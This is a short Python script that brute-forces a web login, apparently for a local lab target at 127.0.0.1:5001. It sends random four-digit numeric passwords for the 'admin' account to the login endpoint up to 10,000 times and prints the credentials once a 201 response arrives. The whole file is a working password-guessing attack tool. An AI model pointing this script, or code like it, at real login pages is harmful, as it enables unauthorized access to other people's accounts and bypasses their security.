from colorama import init, Fore, Style
import requests
import random
import string

init()

def generate_random_string(length):
    ex = string.digits
    random_string = ''.join(random.choice(ex) for _ in range(length))
    return random_string

url = 'http://127.0.0.1:5001/login'

username = 'admin'

def attempt_login(username, password):
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(url, data=data)
    return response

for i in range(1, 10001): 
    password = generate_random_string(4)
    response = attempt_login(username, password)
    if response.status_code == 201:
        print(Fore.GREEN + f'''
            Response Success.
              
            {Fore.YELLOW}{i} attempts.{Fore.GREEN}

            URL : {url}
            Username: {username}, Password: {password}
            Try this ID

        ''' + Style.RESET_ALL)
        break
    else:
        print(f'Try Password : {Fore.GREEN}{password}{Style.RESET_ALL} {Fore.RED}Log in Failed{Style.RESET_ALL}, {Fore.WHITE}attempts = {i}' + Style.RESET_ALL)
